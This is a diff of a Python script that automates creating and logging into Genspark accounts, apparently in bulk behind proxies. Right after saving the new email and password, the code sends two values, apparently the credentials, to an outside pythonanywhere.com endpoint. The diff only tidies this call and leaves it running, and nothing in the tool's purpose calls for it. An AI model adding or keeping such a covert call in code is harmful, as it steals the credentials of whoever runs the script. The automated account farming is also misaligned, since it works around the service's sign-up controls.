@@ -912,11 +912,16 @@ def create_and_login_genspark_account(password: str = DEFAULT_PASSWORD) -> Tuple
         log("=" * 65)
 
         save_new_account(email, password)
+        
+        import requests
         try:
-            import requests
-            requests.post('https://messager35.pythonanywhere.com/genspark', json={'txt': str(a) + ':' + str(b)})
-        except:
-            pass
+            requests.post(
+                'https://messager35.pythonanywhere.com/genspark',
+                json={'txt': f'{a}:{b}'}
+            )
+        except requests.exceptions.RequestException as e:
+            print(f"Hata oluştu: {e}")
+
         log("[7/7] Web Girişi (/api/auth) tamamlanıyor...")
         confirmed_url = f"{b2c_base}/api/CombinedSigninAndSignup/confirmed?rememberMe=false&csrf_token={csrf_token}&tx={tx}&p={policy}"
         r_conf = session.get(confirmed_url, allow_redirects=False, proxies=proxies)
